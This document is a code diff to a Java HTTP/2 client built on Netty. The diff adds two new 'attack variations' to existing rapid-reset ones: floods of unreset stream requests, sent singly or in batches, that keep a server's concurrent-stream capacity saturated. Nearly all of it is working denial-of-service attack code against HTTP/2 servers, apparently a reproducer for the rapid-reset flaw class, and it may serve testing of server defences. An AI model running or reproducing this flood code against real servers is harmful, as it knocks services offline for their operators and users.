@@ -77,6 +77,7 @@ public final class Http2Client {
     // Different attack variations have been found
     // 1 Unending stream requests and resets
     // 2 Batch of stream requests/resets
+    // 3 Unending stream of requests (exceeding maxConcurrentStreams)
     static final int ATTACK_VARIATION = Integer.parseUnsignedInt(System.getProperty("attack", "1"));
 
     public static void main(String[] args) throws Exception {
@@ -90,6 +91,7 @@ public final class Http2Client {
         HttpScheme scheme = SSL ? HttpScheme.HTTPS : HttpScheme.HTTP;
         AsciiString hostName = new AsciiString(HOST + ':' + PORT);
         FullHttpRequest request = createSimpleGetRequest(URL, hostName, scheme);
+        boolean invalidAttack = false;
         // Start test for bombarding streams and cancelling them
         System.err.println("Starting rapid reset requests...");
         try {
@@ -122,15 +124,49 @@ public final class Http2Client {
 
                 switch(ATTACK_VARIATION){
                     case 1:
+                        System.out.println();
+                        System.out.println("***********************************************************");
+                        System.out.println("*********  !!! RUNNING RAPID RESET VARIATION !!!  *********");
+                        System.out.println("***********************************************************");
+                        System.out.println();
                         runRapidResetVariation(initializer, http2SettingsHandler.ctx, request, executor);
                         break;
                     case 2:
+                        System.out.println();
+                        System.out.println("***********************************************************");
+                        System.out.println("******  !!! RUNNING RAPID RESET BATCH VARIATION !!!  ******");
+                        System.out.println("***********************************************************");
+                        System.out.println();
                         runRapidResetBatchVariation(initializer, http2SettingsHandler.ctx, request, executor);
                         break;
+                    case 3:
+                        System.out.println();
+                        System.out.println("***********************************************************");
+                        System.out.println("********  !!! RUNNING RAPID REQUEST VARIATION !!!  ********");
+                        System.out.println("***********************************************************");
+                        System.out.println();
+                        runRapidRequestNoResetVariation(initializer, http2SettingsHandler.ctx, request, executor);
+                        break;
+                    case 4:
+                        System.out.println();
+                        System.out.println("***********************************************************");
+                        System.out.println("*****  !!! RUNNING RAPID REQUEST BATCH VARIATION !!!  *****");
+                        System.out.println("***********************************************************");
+                        System.out.println();
+                        runRapidRequestNoResetBatchVariation(initializer, http2SettingsHandler.ctx, request, executor);
+                        break;
                     default:
-                        System.out.println("Invalid attach variation: "+ATTACK_VARIATION);
+                        invalidAttack = true;
+                        System.out.println();
+                        System.out.println("***********************************************************");
+                        System.out.println("***********  !!! INVALID ATTACK VARIATION: " + ATTACK_VARIATION +" !!!  *********");
+                        System.out.println("***********************************************************");
+                        System.out.println();
                         break;
                 }
+
+                if(invalidAttack)
+                    break;
 
                 System.out.println("Finished HTTP/2 request: " + channel);
 
@@ -225,6 +261,68 @@ public final class Http2Client {
                 }
                 executor.submit(new RequestAndResetCallable(request, ctx,
                     initializer, channel, streamId));
+                Thread.sleep(STREAM_SPREAD_SLEEP);
+            }
+            System.out.println("Finished batch: " + currentBatch + " and resting: " + BATCH_SPREAD_SLEEP + " ms...");
+            Thread.sleep(BATCH_SPREAD_SLEEP);
+        }
+    }
+
+    public static void runRapidRequestNoResetVariation(Http2ClientInitializer initializer, ChannelHandlerContext ctx, final FullHttpRequest request, ExecutorService executor) throws Exception{
+        // Variation 3 rapid requests
+        // Start a lot or requests to keep the pipeline full but don't reset them
+        // Just keep the pipeline full and busy
+        long maxConcurrentStreams = initializer.connectionHandler().connection().remote().maxActiveStreams();
+        final Channel channel = ctx.channel();
+        System.out.println("Going until streams: " + maxConcurrentStreams);
+        // To have concurrent streams running at the same time
+        for (int streamId = 3; streamId / 2 + 1 < maxConcurrentStreams; streamId += 2) {
+            if (!channel.isOpen()) {
+                System.out.println("Channel: "+ channel + " was closed working on stream: " + streamId);
+                break;
+            }
+            executor.submit(new Callable<Void>() {
+                @Override
+                public Void call() throws Exception {
+                    if (!channel.isOpen()) {
+                        System.out.println("Channel: " + channel + " was not open!");
+                        return null;
+                    }
+                    channel.writeAndFlush(request);
+                    return null;
+                }
+            });
+            Thread.sleep(STREAM_SPREAD_SLEEP);
+        }
+    }
+
+    public static void runRapidRequestNoResetBatchVariation(Http2ClientInitializer initializer, ChannelHandlerContext ctx, final FullHttpRequest request, ExecutorService executor) throws Exception{
+        // Variation 4 rapid batch requests
+        // Start a lot or requests to keep the pipeline full but don't reset them
+        // Just keep the pipeline full and busy
+        long maxConcurrentStreams = initializer.connectionHandler().connection().remote().maxActiveStreams();
+        int streamId = 3;
+        boolean shouldStop = false;
+        final Channel channel = ctx.channel();
+        System.out.println("Going until streams: " + maxConcurrentStreams + " with batches of: "+THREAD_NUMBER + " and pauses of: "+BATCH_SPREAD_SLEEP);
+        for(int currentBatch = 1; streamId / 2 + 1 < maxConcurrentStreams || !shouldStop;  currentBatch ++){
+            for (; streamId / 2 + 1 < currentBatch * THREAD_NUMBER; streamId += 2) {
+                if (!channel.isOpen()) {
+                    System.out.println("Channel: "+ channel + " was closed working on stream: " + streamId);
+                    shouldStop = true;
+                    break;
+                }
+                executor.submit(new Callable<Void>() {
+                    @Override
+                    public Void call() throws Exception {
+                        if (!channel.isOpen()) {
+                            System.out.println("Channel: " + channel + " was not open!");
+                            return null;
+                        }
+                        channel.writeAndFlush(request);
+                        return null;
+                    }
+                });
                 Thread.sleep(STREAM_SPREAD_SLEEP);
             }
             System.out.println("Finished batch: " + currentBatch + " and resting: " + BATCH_SPREAD_SLEEP + " ms...");
